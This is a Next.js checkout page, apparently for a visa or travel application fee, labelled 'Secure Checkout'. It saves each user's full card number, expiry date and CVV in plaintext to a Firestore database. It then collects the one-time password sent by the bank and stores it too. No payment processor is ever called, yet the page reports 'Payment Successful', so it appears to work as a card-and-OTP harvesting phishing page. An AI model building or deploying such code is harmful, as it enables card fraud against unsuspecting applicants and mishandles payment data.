
"use client";

import React, { useState, useEffect } from 'react';
import Link from 'next/link';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from '@/components/ui/card';
import { ArrowLeft, ArrowRight, Home, Loader2, ShieldCheck, Lock } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { useRouter, useSearchParams } from 'next/navigation';
import { collection, doc, setDoc, serverTimestamp } from 'firebase/firestore';
import { db } from '@/lib/firebase';
import { Progress } from '@/components/ui/progress';

import { UserDetailsStep } from '@/components/payment-steps/user-details-step';
import { PaymentDetailsStep } from '@/components/payment-steps/payment-details-step';
import { OtpVerificationStep } from '@/components/payment-steps/otp-verification-step';

interface ApplicationData {
  [key: string]: any;
}

export default function CheckoutPage() {
  const [currentStep, setCurrentStep] = useState(1);
  const [isProcessing, setIsProcessing] = useState(false);
  const [applicationData, setApplicationData] = useState<ApplicationData | null>(null);
  const [cardDetails, setCardDetails] = useState(null);
  const [orderId, setOrderId] = useState<string | null>(null);
  
  const { toast } = useToast();
  const router = useRouter();
  const searchParams = useSearchParams();

  useEffect(() => {
    const data = searchParams.get('data');
    if (data) {
      try {
        const parsedData = JSON.parse(decodeURIComponent(data));
        setApplicationData(parsedData);
      } catch (error) {
        console.error("Failed to parse application data", error);
        toast({ title: "Error", description: "Could not load application data.", variant: "destructive" });
        router.push('/');
      }
    }
  }, [searchParams, router, toast]);

  const handleNext = async (data?: any) => {
    if (currentStep === 1) {
      setCurrentStep(2);
    } else if (currentStep === 2) {
      setIsProcessing(true);
      setCardDetails(data);
      
      const newOrderId = doc(collection(db, "orders")).id;
      setOrderId(newOrderId);

      const orderData = {
        ...(applicationData || {
          fullName: "Test User",
          email: "test@example.com",
          nationality: "other",
          passportNumber: "TESTPAY123",
          travelReason: "tourism",
          homeAddress: "123 Test Street",
          phone: "N/A",
        }),
        createdAt: serverTimestamp(),
        status: 'pending_payment',
        amount: applicationData ? 116 : 1,
        cardDetails: {
            cardName: data.cardName,
            cardNumber: data.cardNumber,
            expiryDate: data.expiryDate,
            cvv: data.cvv,
        }
      };
      
      try {
        await setDoc(doc(db, "orders", newOrderId), orderData);
        toast({ title: "Awaiting Payment Verification", description: "Please enter the OTP to verify your payment." });
        setCurrentStep(3);
      } catch (error) {
        console.error("Error creating order: ", error);
        toast({ title: "Error", description: "Could not initiate payment. Please try again.", variant: "destructive" });
      } finally {
        setIsProcessing(false);
      }
    }
  };

  const handleBack = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
    } else {
      router.back();
    }
  };

  const handleVerify = async (otp: string) => {
    if (!orderId || !otp) return;
    setIsProcessing(true);
    
    try {
        const orderRef = doc(db, "orders", orderId);
        await setDoc(orderRef, { status: 'paid', submittedOtp: otp }, { merge: true });
        
        toast({
            title: "Payment Successful!",
            description: "Your payment has been verified and application submitted."
        });
        setCurrentStep(4); // Move to completion step
    } catch (error) {
        console.error("Error updating document: ", error);
        toast({
            title: "Verification Failed",
            description: "There was an error verifying your payment. Please try again.",
            variant: "destructive"
        });
    } finally {
        setIsProcessing(false);
    }
  }
  
  const stepsConfig = [
    { id: 1, title: 'Confirm Details' },
    { id: 2, title: 'Payment Information' },
    { id: 3, title: 'Verify Payment' },
    { id: 4, title: 'Payment Complete' },
  ];

  const progressValue = (currentStep / stepsConfig.length) * 100;

  const renderStepContent = () => {
    if (!applicationData && !searchParams.get('data')) {
      // Allow test pay if no data
    } else if (!applicationData) {
      return <div className="flex items-center justify-center min-h-[300px]"><Loader2 className="animate-spin h-8 w-8" /></div>;
    }

    switch (currentStep) {
      case 1:
        return <UserDetailsStep formData={applicationData!} onNext={handleNext} />;
      case 2:
        return <PaymentDetailsStep onNext={handleNext} isProcessing={isProcessing} />;
      case 3:
        return <OtpVerificationStep onVerify={handleVerify} isProcessing={isProcessing} />;
      case 4:
        return (
          <div className="flex flex-col items-center justify-center p-4 text-center min-h-[300px]">
             <ShieldCheck className="w-16 h-16 text-green-500 mb-4" />
            <h3 className="text-2xl font-bold text-green-500 mb-4">Thank You!</h3>
            <p className="text-muted-foreground mb-6">Your payment has been processed and your application is submitted.</p>
            <Button asChild>
              <Link href="/"><Home className="mr-2" /> Go to Homepage</Link>
            </Button>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="min-h-screen bg-background text-foreground flex flex-col items-center justify-center p-4">
        <Card className="w-full max-w-lg shadow-lg">
            <CardHeader>
                <CardTitle className="text-2xl font-bold">Secure Checkout</CardTitle>
                <CardDescription>
                    {stepsConfig[currentStep - 1].title}
                </CardDescription>
                <Progress value={progressValue} className="mt-4" />
            </CardHeader>
            <CardContent className="min-h-[350px]">
                {renderStepContent()}
            </CardContent>
            {currentStep < 3 && (
                <CardFooter className="flex justify-between">
                    <Button type="button" variant="outline" onClick={handleBack} disabled={isProcessing}>
                        <ArrowLeft className="mr-2" />
                        Back
                    </Button>
                    
                    {currentStep === 1 && (
                      <Button type="button" onClick={() => handleNext()} className="bg-accent hover:bg-accent/90 text-accent-foreground">
                          Proceed to Payment <ArrowRight className="ml-2" />
                      </Button>
                    )}
                </CardFooter>
            )}
        </Card>
    </div>
  );
}
